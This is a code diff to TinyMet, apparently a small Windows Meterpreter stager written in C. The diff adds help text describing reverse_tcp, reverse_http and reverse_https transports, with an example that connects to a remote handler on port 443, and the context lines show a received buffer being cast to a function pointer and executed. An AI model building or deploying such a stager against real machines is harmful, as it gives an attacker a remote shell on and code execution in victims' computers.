@@ -13,6 +13,9 @@ unsigned int bufSize;
 
 
 // Functions ...
+//void err_exit(int error){
+//
+//}
 void gen_random(char *s, const int len) { // ripped from http://stackoverflow.com/questions/440133/how-do-i-create-a-random-alpha-numeric-string-in-c
 	static const char alphanum[] =
 		"0123456789"
@@ -210,6 +213,17 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	if (NULL == szArglist) { // problem parsing?
 		exit(100);
 	}
+	else if (nArgs == 2 && !wcscmp(szArglist[1], L"--help")){ // looking for help?
+		char helpText[] = "TinyMet v0.1 - Visit www.tinymet.com for more info.\n\n"
+			"Usage: tinymet.exe [transport] LHOST LPORT\n\n"
+			"Available transports are as follows:\n"
+			"    0: reverse_tcp\n"
+			"    1: reverse_http\n"
+			"    2: reverse_https\n"
+			"\nExample:\n \"tinymet.exe 2 handler.com 443\"\nwill use reverse_https and connect to host.com:443";
+		MessageBox(NULL, helpText, "TinyMet help", MB_OK);
+		exit(-1);
+	}
 	else if (nArgs != 4){ // less than 4 args?
 		exit(101);
 	}
@@ -233,7 +247,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	default:
 		exit(102); // transport is not 0,1 or 2
 	}
-
 
 	(*(void(*)())buf)();
 	exit(0);
